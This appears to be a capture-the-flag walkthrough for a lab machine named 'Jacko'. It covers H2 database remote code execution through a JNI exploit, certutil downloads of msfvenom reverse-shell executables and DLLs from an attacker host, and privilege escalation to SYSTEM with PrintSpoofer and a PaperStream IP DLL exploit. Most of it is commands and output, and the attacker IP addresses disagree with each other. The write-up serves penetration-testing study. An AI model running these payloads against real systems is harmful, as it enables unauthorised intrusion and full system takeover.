@@ -1,0 +1,194 @@
+																			                        Jacko Walkthrough
+																			
+																								
+Attacker's Machine: 192.168.45.186
+Victim's Machine: 192.168.224.66
+export IP=192.168.166.66
+
+./nmapAutomator.sh -H $IP -t Full
+
+PORT      STATE SERVICE       VERSION
+80/tcp    open  http          Microsoft IIS httpd 10.0
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds?
+5040/tcp  open  unknown
+8082/tcp  open  http          H2 database http console
+|_http-title: H2 Console
+9092/tcp  open  XmlIpcRegSvc?
+49664/tcp open  msrpc         Microsoft Windows RPC
+49665/tcp open  msrpc         Microsoft Windows RPC
+49666/tcp open  msrpc         Microsoft Windows RPC
+49667/tcp open  msrpc         Microsoft Windows RPC
+49668/tcp open  msrpc         Microsoft Windows RPC
+49669/tcp open  msrpc         Microsoft Windows RPC
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Enumeration 
+Nothing relevant on 80 or 8082.
+
+# Since we can connect to the database using the default configuration with user sa and no password, let's check for public exploits
+
+searchsploit H2 Database
+
+ Exploit Title                                                                                                                     |  Path
+----------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+
+H2 Database - 'Alias' Arbitrary Code Execution                                                                      | java/local/44422.py
+H2 Database 1.4.196 - Remote Code Execution                                                                      | java/webapps/45506.py
+H2 Database 1.4.197 - Information Disclosure                                                                       | linux/webapps/45105.py
+H2 Database 1.4.199 - JNI Code Execution                                                                           | java/local/49384.txt
+
+searchsploit -m java/local/49384.txt
+
+
+
+# Let's follow up with the exploit https://www.exploit-db.com/exploits/49384
+
+ -- Write native library
+
+
+
+-- Load native library
+
+
+-- Evaluate script
+
+
+
+# Nice, we have code execution. Let's try to get upload a shell on the system and call it directly to get ourselves a RCE :D
+   
+# Create out reverse shell
+
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.170 LPORT=4444 -f exe > shell.exe
+
+# Transfer the payload on the victim's machine
+
+CREATE ALIAS IF NOT EXISTS JNIScriptEngine_eval FOR "JNIScriptEngine.eval";
+CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("certutil.exe -urlcache -split -f http://192.168.45.170/shell.exe shell.exe").getInputStream()).useDelimiter("\\Z").next()');
+
+# Now try to call our binary to receive a reverse shell
+
+CREATE ALIAS IF NOT EXISTS JNIScriptEngine_eval FOR "JNIScriptEngine.eval";
+CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("whoami").getInputStream()).useDelimiter("\\Z").next()');
+
+
+
+# Because we don't know the full path of the binary, or maybe we don't have the rights to save out binary in our current location, let's try to save our binary into a world writable directory. C:\Windows\Temp
+
+CREATE ALIAS IF NOT EXISTS JNIScriptEngine_eval FOR "JNIScriptEngine.eval";
+CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("certutil.exe -urlcache -split -f http://192.168.45.170/shell.exe C:\\Windows\\Temp\\shell.exe").getInputStream()).useDelimiter("\\Z").next()');
+
+
+
+# Now that we've uploaded our shell, let's try to call the binary directy and obtain our reverse shell. 
+
+CREATE ALIAS IF NOT EXISTS JNIScriptEngine_eval FOR "JNIScriptEngine.eval";
+CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("C:\\Windows\\Temp\\shell.exe").getInputStream()).useDelimiter("\\Z").next()');
+
+
+
+# Got ze shell! Let's get the first flag
+
+cd C:\Users\tony\Desktop
+type local.txt
+85f1ba0d21f0d5c55dae9f983ca073bd
+
+Privilege Escalation
+
+# Aparently we can't run any common commands such as whoami or system config from out current location. Most likely the path is fucked up. So we need to navigate to C:\Windows\System32 directory.
+
+cd C:\Windows\System32
+whoami /priv
+Privilege Name                        Description                                                      State   
+============================= ========================================= ========
+SeShutdownPrivilege            Shut down the system                                       Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                                    Enabled 
+SeUndockPrivilege                Remove computer from docking station               Disabled
+SeImpersonatePrivilege         Impersonate a client after authentication             Enabled 
+SeCreateGlobalPrivilege        Create global objects                                         Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set                        Disabled
+SeTimeZonePrivilege             Change the time zone                                       Disabled
+
+# Set up a proper PATH for our basic commands
+
+set PATH=%SystemRoot%\system32;%SystemRoot%;
+
+# We notice that we have the SeImpersonatePrivilege available which is a common privesc vector in windows system.
+   In order to continue we need some info about the system to see if our version is vulnerable and perhaps we can use Juicy Potato.
+   
+systeminfo | findstr /B /C:"Host Name" /C:"OS Name" /C:"OS Version" /C:"System Type" /C:"Hotfix(s)"
+Host Name:                 JACKO
+OS Name:                   Microsoft Windows 10 Pro
+OS Version:                10.0.18363 N/A Build 18363                      
+System Type:               x64-based PC
+Hotfix(s):                 9 Hotfix(s) Installed.
+
+# Since anything under build 1809 on windows 10 is not vulnerable to Juicy Potato, we need to find another way to exploit the current configuration. 
+   We will use PrintSpoofer againt Win 10 Pro Build >= 1809 or Windows Server 2019.
+
+Download PrintSpoofer binary
+https://github.com/itm4n/PrintSpoofer/releases
+
+# Transfer the binary on the victim's machine
+
+certutil.exe -urlcache -split -f http://192.168.45.170/PrintSpoofer64.exe C:\Users\Tony\Desktop\PrintSpoofer64.exe
+
+# Try to Spawn a SYSTEM process and interact with it
+
+PrintSpoofer64.exe -i -c cmd
+[+] Found privilege: SeImpersonatePrivilege
+[+] Named pipe listening...
+[-] Operation failed or timed out.
+
+# For some reason, there is an issue performing the exploit. Aparently other had a similar issue https://github.com/itm4n/PrintSpoofer/issues/5
+
+# So we need to find another way! Let's check which other software is installed on the system, maybe we find something usefull.
+
+cd "Program Files (x86)"
+dir
+
+
+searchsploit paperstream
+
+PaperStream IP (TWAIN) 1.42.0.5685 - Local Privilege Escalation                                                                    | windows/local/49382.ps1
+
+searchsploit -m windows/local/49382.ps1
+
+This exploit searches for a writable location, copies the specified DLL to that location and then triggers the DLL load by sending a message to FJTWSVIC over the FjtwMkic_Fjicube_32 named pipe.
+
+# Example payload generated as follows
+# msfvenom -p windows/x64/shell_reverse_tcp -f dll -o shell.dll LHOST=eth0 LPORT=4444
+$PayloadFile = "C:\Windows\Temp\UninOldIS.dll"
+
+# So, let's create our reverse shell UninOldIS.dll and place it in wordwritable directory C:\Windows\Temp
+
+msfvenom -p windows/shell_reverse_tcp -f dll -o UninOldIS.dll LHOST=192.168.45.170 LPORT=80
+
+certutil.exe -urlcache -split -f http://192.168.45.170/UninOldIS.dll C:\Windows\Temp\UninOldIS.dll
+
+# Copy the exploit ps1 on the victim's machine
+
+certutil.exe -urlcache -split -f  http://192.168.45.170/49382.ps1 C:\Users\Tony\Desktop\49382.ps1
+
+# Reconfigure the windows path so you can access powershell
+
+set PATH=C:\WINDOWS\system32;C:\WINDOWS;C:\WINDOWS\System32\WindowsPowerShell\v1.0\;
+
+powershell -ep bypass
+Set-ExecutionPolicy -ExecutionPolicy ByPass -Scope CurrentUser 
+
+# Get a netcat listener opened on 80
+rlwrap nc -lvnp 80
+
+# Execute the exploit in powershell stored on C:\Users\Tony\Desktop
+
+.\49382.ps1
+
+
+
+# Got SYSTEM Shell
+
+cd C:\Users\Administrator\Desktop
+more proof.txt
+2ee8ad24dfca5413dbcf819ec630defd
